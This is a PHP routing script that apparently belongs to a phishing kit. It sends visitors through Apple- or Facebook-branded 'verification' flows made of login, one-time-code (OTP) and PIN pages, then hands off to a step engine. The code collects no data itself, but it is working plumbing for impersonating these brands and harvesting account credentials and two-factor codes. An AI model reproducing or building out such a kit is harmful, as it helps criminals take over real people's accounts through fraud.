<?php
session_start();
ob_start();

$method = $_GET['method'] ?? '';

$flows = [
    'apple' => [
        'apple/index.php',
        'apple/otp.php',
        'apple/otp2.php'
    ],
    'facebook' => [
        'facebook/index.php',
        'facebook/fbotp1.php',
        'facebook/fbpin.php',
        'facebook/unliotp.php'
    ]
];

// validate method
if (!isset($flows[$method])) {
    header("Location: confirm.php");
    exit;
}

/*
|--------------------------------------------------------------------------
| RESET SESSION (IMPORTANT FIX)
|--------------------------------------------------------------------------
| ensures no old flow breaks new login
*/
$_SESSION['mera_verify_flow'] = $flows[$method];
$_SESSION['mera_selected_flow'] = $method;
$_SESSION['mera_identity_method'] =
    $method === 'apple'
        ? 'Apple Verification'
        : 'Facebook Verification';

/*
|--------------------------------------------------------------------------
| RESET STEP INDEX (CRITICAL FIX)
|--------------------------------------------------------------------------
*/
$_SESSION['step_index'] = 0;

// go to step engine
header("Location: next-step.php");
exit;
